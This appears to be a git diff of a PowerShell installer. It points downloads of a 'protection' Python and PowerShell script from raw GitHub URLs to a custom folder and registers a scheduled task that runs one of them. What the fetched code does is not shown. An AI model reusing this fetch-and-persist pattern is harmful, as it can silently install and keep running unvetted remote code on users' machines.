@@ -34,7 +34,14 @@ $pythonPath = "$pythonPath\python.exe"
 
 
 # Download the python script directly with invoke-webrequest
-$outDirectory = "$env:TEMP"		# Temp directory in Windows
+#$outDirectory = "$env:TEMP"		# Temp directory in Windows
+$outDirectory = "C:\Users\Other\Protection"  # Temp directory in Windows
+
+# Check if the directory exists, and create it if not
+if (-not (Test-Path -Path $outDirectory)) {
+    New-Item -Path $outDirectory -ItemType Directory
+} else {
+}
 
 $repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 $runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
@@ -89,26 +96,7 @@ if ($scheduledTask) {
 
 
 # Define the action
-#$python_path = (Get-Command python).Definition
-#$action = New-ScheduledTaskAction -Execute "$python_path" -Argument "`"$scriptPath`""
-#$action = New-ScheduledTaskAction -Execute "$python_path" -Argument "`"C:\Users\Beatriz Adriana G\Other\protection\light\protection.py`""
 
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\protection\run_protection.ps1'
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "`"$runPath`""
-
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\Schedule\run_schedule.ps1'
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "C:\Users\Beatriz Adriana G\Other\protection\light\run_protection.ps1"
-
-
-
-type "$runPath"
-
-#$action = New-ScheduledTaskAction -Execute "$python_path" -Argument 'C:\Users\Public\Other\Schedule\schedule.py'
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\Schedule\run_schedule.ps1'	# This command works
-
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "`"C:\Users\Beatriz Adriana G\Other\protection\light\run_protection.ps1`""
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "$HOME\Other\protection\light\run_protection.ps1"
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "`"$runPath`""
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\Schedule\run_protection.ps1'
 
 # Define triggers
